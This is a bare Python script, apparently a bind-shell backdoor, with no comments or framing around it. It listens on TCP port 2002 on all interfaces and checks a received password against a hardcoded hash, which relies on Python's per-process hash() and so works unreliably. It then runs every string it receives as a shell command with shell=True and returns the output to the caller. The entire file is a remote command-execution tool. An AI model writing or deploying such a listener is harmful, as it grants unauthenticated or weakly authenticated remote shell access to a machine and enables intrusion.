import subprocess
import socket

PASSWORD_HASH = 6784976730375153354
LISTEN_IP = ''
LISTEN_PORT = 2002

def authenticate(conn):
    try:
        received = conn.recv(1024)
        if hash(received.decode()) == PASSWORD_HASH:
            return True
        else:
            conn.close()
            return False
    except Exception:
        conn.close()
        return False

def handle_client(conn):
    while True:
        try:
            cmd = conn.recv(1024)
            if not cmd:
                break

            command = cmd.decode()

            if command == 'quit':
                break

            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, errors = proc.communicate()
            response = output + errors if (output + errors) else b'Command executed with no output'

            conn.send(response)

        except Exception as e:
            print("Error handling client: {}".format(e))
            break

def main():
    server = socket.socket()
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)
    print("[+] Server listening...")

    try:
        conn, addr = server.accept()
        if authenticate(conn):
            print("[+] Authenticated connection from {}".format(addr))
            handle_client(conn)
        else:
            print("[-] Authentication failed.")
    finally:
        server.close()

if __name__ == "__main__":
    main()
